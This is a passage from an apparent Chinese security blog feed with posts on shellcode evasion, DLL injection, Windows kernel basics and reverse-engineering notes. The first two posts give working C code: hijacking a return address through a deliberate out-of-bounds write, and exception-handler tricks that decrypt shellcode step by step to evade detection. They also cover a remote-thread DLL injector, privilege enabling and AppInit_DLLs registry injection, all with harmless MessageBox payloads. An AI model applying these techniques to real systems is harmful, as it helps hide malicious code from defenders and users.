(int)Decshellcode;</code></pre><p>将shellcode的地址覆盖ret的地址</p><p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p><h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p><p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;void Decshellcode(){//完成恶意代码的释放、解密、执行MessageBoxA(0, "不要再打了", "我错了", MB_OK);}#pragma optimize("",off)int main(){int a = 2022;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)Decshellcode;//return 0;}#pragma optimize("",on)</code></pre><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559733763.png"></p><h1 id="0x07-shellcode的加密与释放"><a href="#0x07-shellcode的加密与释放" class="headerlink" title="0x07-shellcode的加密与释放"></a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p><p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png"></p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("ldata")char trapcode[] = "*";unsigned long long llcode = 204;//CC 00 00 00INT3#pragma data_seg()#pragma comment(linker,"/SECTION:ldata,RWE")void Decshellcode(){llcode = 0xF333333333333333;llcode &lt;&lt;= 2;char* data = (char*)&amp;llcode;/** 解密shellcode 并且执行* len 解密后的指令长度* data 把解密后的指令写入data* 比如 push ebp 就向data写入0x55* 每次解密一条指令 不要用超过7字节的指令和跳转指令*/MessageBoxA(0, "不要再打辣", "停下", MB_OK);return ;}long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val){if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT){Decshellcode();val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;return EXCEPTION_CONTINUE_EXECUTION;}elsereturn EXCEPTION_CONTINUE_SEARCH;}#pragma optimize("",off)int main(){AddVectoredExceptionHandler(1, ExceptionHandle);int bilibili = 2020;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)&amp;llcode;return 0;}#pragma optimize("",on)</code></pre><p><a href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p><p><a href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p><p>AddVectoredExceptionHandler是异常处理机制try和except的封装，val-&gt;ExceptionRecord-&gt;ExceptionCode记录着异常的类型</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581840737.png"></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581929518.png"></p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649582032897.png"></p><h1 id="shellcode注入"><a href="#shellcode注入" class="headerlink" title="shellcode注入"></a>shellcode注入</h1><p>当然shellcode注入不止这种，还有其他的方法</p><p><a href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021">https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021</a></p><p><a href="https://cloud.tencent.com/developer/article/1787191">https://cloud.tencent.com/developer/article/1787191</a></p><p>shellcode加密</p><p><a href="https://www.cnblogs.com/LyShark/p/13033722.html">https://www.cnblogs.com/LyShark/p/13033722.html</a></p><h1 id="0x08-隐藏API"><a href="#0x08-隐藏API" class="headerlink" title="0x08-隐藏API"></a>0x08-隐藏API</h1><p>利用栈溢出隐藏API</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL注入</title>
      <link href="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/04/09/DLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-远程线程注入"><a href="#0x00-远程线程注入" class="headerlink" title="0x00-远程线程注入"></a>0x00-远程线程注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>线程注入，是通过开启远程线程的方式，将DLL加载到目标宿主进程中的常用方式。</p><p>由于WinNT系统下进程空间的独立性，获取其他进程的信息，就需要进入目标进程空间的方式，而使用线程注入可以轻松实现。</p><blockquote><p>使用LoadLibrary动态加载DLL</p><p>使用GetProcAddress获取DLL中导出函数的指针</p></blockquote><h3 id="DLL的分类"><a href="#DLL的分类" class="headerlink" title="DLL的分类"></a>DLL的分类</h3><p>在VS的编译环境下，DLL又分为三类：</p><blockquote><p>非MFC的DLL——即使用SDK API进行编程，能被其他所有语言调用</p><p>MFC规则DLL——可以使用MFC进行编程，能被其他所有语言调用</p><p>MFC扩展DLL——可以使用MFC进行编程，但只能被用MFC编写的程序调用</p></blockquote><p>MFC——Microsoft Foundation Class-Library是微软用C++对API进行的封装，全部封装成了类，简化了使用</p><h3 id="DLL的入口点和参数"><a href="#DLL的入口点和参数" class="headerlink" title="DLL的入口点和参数"></a>DLL的入口点和参数</h3><pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI DllMain(    HINSTANCE hinstDLL,  // handle to DLL module    DWORD fdwReason,     // reason for calling function    LPVOID lpReserved )  // reserved{    // Perform actions based on the reason for calling.    switch( fdwReason )     {         case DLL_PROCESS_ATTACH:         // Initialize once for each new process.进程第一次链接DLL并通过它的入口点会得到这个参数         // Return FALSE to fail DLL load.            break;        case DLL_THREAD_ATTACH:         // Do thread-specific initialization.进程在空间中取消DLL的映射时会得到这个参数            break;        case DLL_THREAD_DETACH:         // Do thread-specific cleanup.每当新线程创建时，系统会对所有映射的DLL传入此参数调用入口函数            break;        case DLL_PROCESS_DETACH:         // Perform any necessary cleanup.每当线程退出或者返回时时，系统会对所有映射的DLL传入此参数要求执行对应清理工作            break;    }    return TRUE;  // Successful DLL_PROCESS_ATTACH.}</code></pre><h2 id="DLL编写与导出"><a href="#DLL编写与导出" class="headerlink" title="DLL编写与导出"></a>DLL编写与导出</h2><p>DLL的导出函数使用</p><blockquote><p>extern “C” _declspec(dllexport)</p></blockquote><p>DLL的导入函数使用</p><blockquote><p>extern “C” _declspec(dllimport)</p></blockquote><p>其中，extern “C”作为一种编译约定，表示按照C语言的方式导出</p><blockquote><p> 由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般只包括函数名。 这样我们就可以直接通过函数名对DLL导出函数进行调用</p></blockquote><h3 id="DLL动态加载"><a href="#DLL动态加载" class="headerlink" title="DLL动态加载"></a>DLL动态加载</h3><p>既然我们要把DLL注入到进程中，那么需要先了解一下，进程是怎样调用DLL的</p><pre class="language-c" data-language="c"><code class="language-c">//使用LoadLibrary加载所需的DLL//LoadLibraryA和LoadLibraryW分别对应ANSI编码下和Unicode编码下，因为一般都是Unicode，所以一般用w，路径记得改为\\HMODULE hMod = LoadLibraryA(DLL路径);//定义导入函数指针typedef int (*ADD_IMPORT)(int a,int b);//定义一个返回值为int型的函数指针,这样ADD_IMPORT就是一个函数指针//使用GetProcAddress获取函数入口点ADD_IMPORT add_proc=(ADD_IMPORT)GetProcAddress(hMod,"ADD");//直接调用int result = add_proc(1,2);//释放句柄FreeLibrary(hMod);</code></pre><h2 id="线程注入"><a href="#线程注入" class="headerlink" title="线程注入"></a>线程注入</h2><h3 id="注入的可行性"><a href="#注入的可行性" class="headerlink" title="注入的可行性"></a>注入的可行性</h3><blockquote><p>kernel32.dll和user32.dll是两个在大部分程序上都会调用的DLL</p><p>同一个DLL，在不同进程中不一定被映射（加载）在同一个内存地址下</p><p>但是kernel32.dll和user32.dll除外，它们总是被映射到进程的内存首选地址</p><p>因此在所有使用这两个DLL的进程中，这两个DLL的内存地址是相同的</p><p>因此<strong>我们在本进程获取的kernel32.dll中函数的地址，在目标进程也是一样的</strong></p></blockquote><h3 id="线程注入过程"><a href="#线程注入过程" class="headerlink" title="线程注入过程"></a>线程注入过程</h3><blockquote><p>目标进程-&gt;开辟并传入DLL地址-&gt;开启远程线程-&gt;加载DLL-&gt;实现DLL的注入</p></blockquote><p>依次使用以下函数</p><pre class="language-c" data-language="c"><code class="language-c">OpenProcess()//获取目标进程的句柄VirtualAllocEx()//在进程中申请空间WriteProcessMemory()//向进程中写入DLL路径GetProcAddress()//取得函数LoadLibrary在DLL中的地址CreateRemoteThreadEx()//在目标进程中创建新线程使用LoadLibrary加载DLLWaitForSingleObject()//挂起线程，可以传递INFINITE指明要无限期等待下去，等待线程执行完再执行下一步CloseHandle()//关闭句柄</code></pre><p> CreateRemoteThread()函数</p><pre class="language-c" data-language="c"><code class="language-c">HANDLE WINAPI CreateRemoteThread(    LPSECURITY_ATTRIBUTES   lpThreadAttributes, //线程安全相关的属性，常置为NULL    SIZE_T                  dwStackSize,        //新线程的初始化栈在大小，可设置为0    LPTHREAD_START_ROUTINE  lpStartAddress,     //被线程执行的回调函数，也称为线程函数    LPVOID                  lpParameter,        //传入线程函数的参数，不需传递参数时为NULL    DWORD                   dwCreationFlags,    //控制线程创建的标志    LPDWORD                 lpThreadId          //传出参数，用于获得线程ID，如果为NULL则不返回线程ID);</code></pre><p>目标其实就是让目标进程调用<code>LoadLibrary()</code>加载dll </p><blockquote><p>将线程函数指定为LoadLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><p>CreateRemoteThread()原意是在外部进程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><p>Inject.cpp</p><pre class="language-c" data-language="c"><code class="language-c">#include "windows.h"#include "tchar.h"BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath){    HANDLE hProcess = NULL, hThread = NULL;    HMODULE hMod = NULL;    LPVOID pRemoteBuf = NULL;    //确定路径需要占用的缓冲区大小    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    // #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限）    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))    {        _tprintf(L"OpenProcess(%d) failed!!! [%d]\n", dwPID, GetLastError());        return FALSE;    }    // #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName      // VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址,最后一个参数表示开辟内存的属性    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    // #3.  将myhack.dll路径 ("c:\\myhack.dll")写入目标进程中分配到的内存    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    // #4. 获取LoadLibraryA() API的地址      // 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到         // InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地      // 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的      // kernerl32.dll的加载地址还是一样的。    hMod = GetModuleHandle(L"kernel32.dll");    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");    // #5. 在目标进程notepad.exe中运行远程线程      // pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址      // pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    //同样，记得关闭句柄    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;}int _tmain(int argc, TCHAR* argv[]){    if (argc != 3)    {        _tprintf(L"USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n", argv[0]);        return 1;    }    // inject dll    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))        _tprintf(L"InjectDll(\"%s\") success!!!\n", argv[2]);    else        _tprintf(L"InjectDll(\"%s\") failed!!!\n", argv[2]);    return 0;}</code></pre><p>inject.dll</p><pre class="language-c" data-language="c"><code class="language-c">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include&lt;windows.h&gt;#include&lt;stdio.h&gt;extern "C" _declspec(dllexport) void Print(){    printf("helloworld");}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        MessageBoxA(0, "注入成功", "Hint", MB_OK);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655410419.png"></p><p>可以看到在notepad.exe的进程中注入了inject.dll</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655358785.png"></p><h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p><a href="https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;utm_relevant_index=1">https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;utm_relevant_index=1</a></p><p>有时候需要提升进程权限</p><blockquote><p>在枚举/结束系统进程/或操作系统服务时，会出现自己权限不足而失败的情况，这时就需要提升自己进程到系统权限</p></blockquote><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><blockquote><p><strong>Windows的每个用户登录时，系统会产生一个访问令牌(access token)，其中关联了当前用户的权限信息，用户登录后创建的每一个进程都含有用户access token的拷贝。当进程试图执行某些需要特殊权限的操作或者是访问受保护的内核对象时，系统会检查其access token中的权限信息以决定是否授权操作。</strong></p></blockquote><p>Administrator组成员的access token中会含有一些可以执行系统级操作的特权(privileges)，如终止任意进程、关闭\重启系统、加载设备驱动和更改系统时间等，不过这些权限默认是被禁用的</p><p> 当Administrator组成员创建的进程中包含一些需要特权的操作时，进程必须首先打开这些禁用的特权以提升自己的权限，否则系统将拒绝进程的操作。 </p><blockquote><p><strong>windows以字符串的形式表示系统特权，如”SeCreatePageFilePrivilege“表示该特权用于创建页面文件，”SeDebugPrivilege“表示该特权可用于调试及更改其他进程的内存，为了方便使用这些字符串，微软在winnt.h定义了一组宏，如#define SE_DEBUG_NAME TEXT(“SeDebugPrivilege”)</strong></p></blockquote><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649725957948.png" alt="权限列表"></p><p>在vs的定义也可以看到，这些宏定义对应了不同的权限，可以使用LookupPrivilege函数得到对应权限的LUID</p><blockquote><p><strong>虽然Windows使用字符串表示特权，但查询或更改特权的API需要LUID来引用相应的特权，LUID表示 local unique identifier ，在系统中是唯一的。为了提升进程权限到指定的特权，我们必须找到特权对应的LUID，这时候就需要调用LookupPrivilege函数，获取到特权对应的LUID时，我们要打开该特权，此时要用到LUID_AND_ATTRIBUTES结构</strong></p></blockquote><p>其定义如下</p><pre class="language-c" data-language="c"><code class="language-c">typedef struct _LUID_AND_ATTRIBUTES {    LUID Luid;    DWORD Attributes;} LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES;</code></pre><p>当Attributes的值取SE_PRIVILEGE_ENABLED时将打开LUID对应的特权。设置完成后</p><blockquote><p><strong>AdjustTokenPrivileges函数通知操作系统将指定的access token权限中的特权置为打开状态，前面我们说过，进程执行需要特列权限的操作时，系统将检查其access token，因此更改了进程的access token特权设置，也就是更改了所属进程的特权设置</strong></p></blockquote><p>函数定义如下</p><pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI AdjustTokenPrivileges(  __in          HANDLE TokenHandle,  __in          BOOL DisableAllPrivileges,  __in_opt      PTOKEN_PRIVILEGES NewState,  __in          DWORD BufferLength,  __out_opt     PTOKEN_PRIVILEGES PreviousState,  __out_opt     PDWORD ReturnLength);</code></pre><p>TokenHandle是要更改特权设置的access token的句柄，DisableAllPrivileges表示是否禁用该access token的所有特权，NewState用来传递新的特权设置，注意它的类型是PTOKEN_PRIVILEGES，它是TOKEN_PRIVILEGES结构的指针</p><p>TOKEN_PRIVILEGES定义如下</p><pre class="language-c" data-language="c"><code class="language-c">typedef struct _TOKEN_PRIVILEGES {    DWORD PrivilegeCount;    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</code></pre><blockquote><p><strong>其中ANYSIZE_ARRAY被定义为1，可以看到TOKEN_PRIVILEGES中包含了用于设置特权信息的LUID_AND_ATTRIBUTES结构，在使用时，只需要将PrivilegeCount赋为1，然后把Privileges数组的第1个元素（Privileges[0]）的Luid域设置为指定特权的Luid，再将其Attributes域设置为SE_PRIVILEGE_ENABLED，就可以完成TokenHandle表示的access token权限的提升了</strong></p></blockquote><pre class="language-c" data-language="c"><code class="language-c">BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){TOKEN_PRIVILEGES tp;HANDLE hToken;LUID luid;//获取当前进程的access token句柄if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken)){_tprintf(L"OpenProcessToken error: %u\n", GetLastError());return FALSE;}//查找newprivileges参数对应的Luid，并将结果写入tp.Privileges[0]的Luid域中if (!LookupPrivilegeValue(NULL,           // lookup privilege on local systemlpszPrivilege,  // privilege to lookup &amp;luid))        // receives LUID of privilege{_tprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());return FALSE;}//设置tp的结构tp.PrivilegeCount = 1;tp.Privileges[0].Luid = luid;if (bEnablePrivilege)tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;elsetp.Privileges[0].Attributes = 0;//通知操作系统更改权限// Enable the privilege or disable all privileges.if (!AdjustTokenPrivileges(hToken,FALSE,&amp;tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)){_tprintf(L"AdjustTokenPrivileges error: %u\n", GetLastError());return FALSE;}if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){_tprintf(L"The token does not have the specified privilege. \n");return FALSE;}return TRUE;}</code></pre><h1 id="0x01-注册表注入"><a href="#0x01-注册表注入" class="headerlink" title="0x01-注册表注入"></a>0x01-注册表注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Windows操作系统的注册表默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658626858.png"></p><p>在注册表编辑器中，将要注入的DLL路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1.重启后，指定DLL会注入所有进程。</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658441593.png"></p><h1 id="0x02-SetWindowsHookEx"><a href="#0x02-SetWindowsHookEx" class="headerlink" title="0x02-SetWindowsHookEx()"></a>0x02-SetWindowsHookEx()</h1><p>在另一篇文章Hook写了，就不过多介绍</p><p>下面是更详细的解释</p><p><a href="https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3">https://cloud.tencent.com/developer/article/1199648?msclkid=f79c9cc7b96011ecbdb2f47296f3b9d3</a></p><p>注入DLL的第三个方法就是消息钩取</p><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658514411.png"></p><h1 id="0x03-还有其他方法"><a href="#0x03-还有其他方法" class="headerlink" title="0x03-还有其他方法"></a>0x03-还有其他方法</h1><p><a href="https://bbs.pediy.com/thread-253918.htm">https://bbs.pediy.com/thread-253918.htm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核基础</title>
      <link href="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-权限级别"><a href="#0x00-权限级别" class="headerlink" title="0x00-权限级别"></a>0x00-权限级别</h1><p>先来看一下特权级环，从里往外权限逐渐降低</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650108857255.png" alt="特权级环"></p><blockquote><p><strong>系统内核层，又叫零环（Ring 0，简称“R0”；与此对应的应用层叫3环，即Ring 3，简称“R3”），实际上是CPU的4个运行级别中的一个</strong></p></blockquote><p>CPU设计者将CPU的运行级别从内往外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低。CPU设计制造商在设计之初是让R0运行内核，让R1、R2运行驱动设备，让R3运行应用程序的。</p><p>操作系统设计者与开发商在设计操作系统（例如微软Windows和开源社区的Linus编写的Linux）的时候，为了让工作变得简单，<strong>并没有使用R1和R2两个级别，而是将设备驱动运行在与内核一个级别的R0级</strong></p><p>在AMD64CPU诞生之后，CPU的设计者干脆也和操作吸引保持一致，只保留了R0和R3两个级别</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109580425.png" alt="Windows XP体系结构简图"></p><p>HAL是一个可加载的核心模块HAL.DLL，它为运行在Windows XP上的硬件平台提供低级接口。Windows XP的执行体是NTOSKRNL.EXE的上层（内核是其下层）。用户层导出并且可以调用的函数接口在NTDLL.DLL中，通过Win32 API或其他环境子系统对它们进行访问</p><p><img src="/2022/04/09/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80/1650109820013.png"></p><h1 id="0x01-内存空间布局"><a href="#0x01-内存空间布局" class="headerlink" title="0x01-内存空间布局"></a>0x01-内存空间布局</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理</title>
      <link href="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
      <url>/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-调试Helloworld程序"><a href="#0x00-调试Helloworld程序" class="headerlink" title="0x00-调试Helloworld程序"></a>0x00-调试Helloworld程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326083343.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649326142470.png"></p><p>选择Release模式生成的可执行文件能使程序代码更简洁，方便调试-之前我都是debug模式的，难怪有一堆初始化操作</p><blockquote><p>OD指令-Ctrl+F2，重新开始调试</p><p>​                Ctrl+F9，一直在函数代码内部运行，知道遇到retn，跳出函数</p><p>​                :可以给地址添加标签</p><p>​                Ctrl+E，编辑数据</p><p>​                空格，编写汇编代码</p></blockquote><h1 id="0x01-小端序标记法"><a href="#0x01-小端序标记法" class="headerlink" title="0x01-小端序标记法"></a>0x01-小端序标记法</h1><p>采用小端序时，地址高位存储数据的高位，地址低位存储数据的低位，我们知道一个地址最多存储一个字节的单元，也就是两个十六进制，那么0x12345678在内存存储中时则为78 56 34 12</p><h1 id="0x02-IA-32寄存器基本讲解"><a href="#0x02-IA-32寄存器基本讲解" class="headerlink" title="0x02-IA-32寄存器基本讲解"></a>0x02-IA-32寄存器基本讲解</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328781711.png" alt="通用寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328919424.png" alt="寄存器作用"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649328950871.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333035627.png" alt="段寄存器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333102096.png"></p><p>其中FS寄存器比较重要，用于计算SEH、TEB、PEB等地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333204894.png" alt="重要标志位"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333235729.png"></p><h1 id="0x03-栈"><a href="#0x03-栈" class="headerlink" title="0x03-栈"></a>0x03-栈</h1><p>栈的特征</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333398152.png" alt="栈的特征"></p><p>函数调用入栈顺序</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333596093.png"></p><h1 id="0x04-栈帧"><a href="#0x04-栈帧" class="headerlink" title="0x04-栈帧"></a>0x04-栈帧</h1><p>通过EBP-栈帧指针寄存器访问局部变量、参数、函数返回地址</p><p>函数开始时要先把已有值保存到栈中</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649333832316.png"></p><p>指出相关内存属于哪个段</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334137175.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334312797.png" alt="返回值"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334395974.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334452555.png" alt="外平栈和内平栈"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334531491.png" alt="xor eax,eax"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334591186.png" alt="关闭段显示"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334796214.png" alt="函数的间接调用"></p><p>Test相当于&amp;命令，改变ZF的值</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649334897963.png" alt="TEST指令"></p><h1 id="0x05-Process-Explorer"><a href="#0x05-Process-Explorer" class="headerlink" title="0x05-Process Explorer"></a>0x05-Process Explorer</h1><p>安装Peocess Explorer、sysinternals</p><h1 